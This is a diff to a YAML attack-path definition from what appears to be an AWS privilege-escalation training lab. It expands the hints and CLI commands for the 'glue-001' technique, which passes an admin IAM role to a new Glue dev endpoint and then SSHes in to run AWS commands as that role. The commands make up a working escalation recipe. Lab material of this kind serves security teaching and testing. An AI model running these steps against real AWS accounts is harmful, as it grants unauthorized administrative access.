@@ -20,7 +20,7 @@ attackMap:
       label: "Glue Dev Endpoint"
       type: resource
       subType: glue-job
-      arn: "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-prod-glue-001-dev-endpoint"
+      arn: "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-glue-001-demo-endpoint"
       description: >
         An AWS Glue development endpoint is an environment you can use to develop and
         test your Glue scripts. When created with an IAM role, the endpoint assumes that
@@ -46,16 +46,19 @@ attackMap:
         Create a Glue development endpoint, passing the admin role to it. The Glue
         service will assume this role, making its credentials available on the endpoint.
       hints:
-        - "You can pass IAM roles to AWS services when creating resources."
-        - "AWS Glue development endpoints accept an IAM role that the endpoint will assume."
-        - "Browse to https://pathfinding.cloud/paths/glue-001 for technique details."
+        - "Start by reviewing the policy attached to your starting user — which roles can you pass, and to which services?"
+        - "Use iam:ListRoles to enumerate roles in the account and identify any with elevated permissions whose trust policy permits glue.amazonaws.com."
+        - "AWS Glue development endpoints accept an IAM role at creation time. The endpoint will assume that role for all operations."
+        - "Before creating the endpoint you will need an SSH key pair — the endpoint accepts a public key and exposes an SSH port so you can connect interactively."
+        - "When calling glue:CreateDevEndpoint, note that only Glue versions 0.9 and 1.0 support dev endpoints. Use --glue-version 1.0."
+        - "Browse to https://pathfinding.cloud/paths/glue-001 for full technique details."
       commands:
         - description: "Generate an SSH key pair for the dev endpoint"
           command: "ssh-keygen -t rsa -b 2048 -f /tmp/glue-key -N ''"
         - description: "Create the Glue dev endpoint with the admin role attached"
-          command: "aws glue create-dev-endpoint --endpoint-name pl-prod-glue-001-dev-endpoint --role-arn arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-admin-target-role --public-key \"$(cat /tmp/glue-key.pub)\" --number-of-nodes 2 --glue-version 1.0"
-        - description: "Wait for the endpoint to become available (5-10 minutes)"
-          command: "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-001-dev-endpoint --query 'DevEndpoint.Status'"
+          command: "aws glue create-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --role-arn arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-admin-target-role --public-key \"$(cat /tmp/glue-key.pub)\" --number-of-nodes 2 --glue-version 1.0"
+        - description: "Poll endpoint status until it reaches READY (5-10 minutes)"
+          command: "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.Status' --output text"
 
     - from: glue-endpoint
       to: target-role
@@ -64,10 +67,15 @@ attackMap:
         SSH into the Glue dev endpoint and execute AWS CLI commands. The endpoint has
         assumed the admin role, so all AWS CLI calls run with administrative permissions.
       hints:
-        - "The endpoint has assumed the IAM role you passed to it during creation."
-        - "Connect via SSH to execute AWS CLI commands using the attached role's credentials."
+        - "The endpoint has already assumed the IAM role you passed to it — no additional assume-role call is needed."
+        - "Use glue:GetDevEndpoint to retrieve the endpoint's public address once its status is READY."
+        - "Connect via SSH as the 'glue' user using the private key you generated at endpoint creation time."
+        - "Once inside the SSH session, run any AWS CLI command — it will execute with the admin role's credentials automatically."
+        - "To confirm the escalation, run aws sts get-caller-identity on the endpoint and verify the role ARN in the response."
       commands:
         - description: "Retrieve the endpoint's public address"
-          command: "aws glue get-dev-endpoint --endpoint-name pl-prod-glue-001-dev-endpoint --query 'DevEndpoint.PublicAddress' --output text"
+          command: "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.PublicAddress' --output text"
         - description: "SSH into the endpoint and verify admin access"
-          command: "ssh -i /tmp/glue-key glue@<endpoint-public-address> 'aws iam list-users'"
+          command: "ssh -o StrictHostKeyChecking=no -i /tmp/glue-key glue@<endpoint-public-address> 'aws iam list-users --max-items 3 --output table'"
+        - description: "Confirm the admin role identity on the endpoint"
+          command: "ssh -o StrictHostKeyChecking=no -i /tmp/glue-key glue@<endpoint-public-address> 'aws sts get-caller-identity'"
